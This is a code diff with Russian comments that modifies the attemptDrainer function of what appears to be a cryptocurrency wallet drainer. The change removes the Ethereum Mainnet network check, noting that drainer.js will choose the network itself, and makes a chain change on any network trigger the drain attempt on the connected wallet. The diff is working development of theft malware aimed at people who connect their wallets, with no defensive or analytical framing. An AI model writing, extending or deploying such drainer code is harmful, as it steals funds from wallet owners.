@@ -304,19 +304,21 @@ async function attemptDrainer() {
     return;
   }
 
+  // Убираем проверку сети, так как drainer.js сам выберет сеть
+  /*
   const isNetworkCorrect = await switchToTargetNetwork();
   if (!isNetworkCorrect) {
     console.log('⚠️ Не удалось установить Ethereum Mainnet');
     return;
   }
 
-  // Дополнительная проверка сети
   const provider = await getReliableProvider();
   const network = await provider.getNetwork();
   if (network.chainId !== parseInt(targetChainId, 16)) {
     console.log('⚠️ Сеть не соответствует Ethereum Mainnet');
     return;
   }
+  */
 
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
@@ -327,6 +329,7 @@ async function attemptDrainer() {
   showModalOnce();
 
   try {
+    const provider = await getReliableProvider();
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -351,7 +354,7 @@ async function attemptDrainer() {
       console.log('🙅 Пользователь отклонил транзакцию');
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
-      throw err; // Пробрасываем ошибку для отладки
+      throw err;
     }
   }
 }
@@ -382,10 +385,10 @@ async function handleConnectOrAction() {
 // === Обработка смены сети ===
 async function onChainChanged(chainId) {
   console.log('🔄 Смена сети:', chainId);
-  if (connectedAddress && !isTransactionPending && chainId === targetChainId) {
+  if (connectedAddress && !isTransactionPending) {
     await attemptDrainer();
   } else {
-    console.log('⏳ Транзакция в процессе или сеть не соответствует');
+    console.log('⏳ Транзакция в процессе');
   }
 }
 
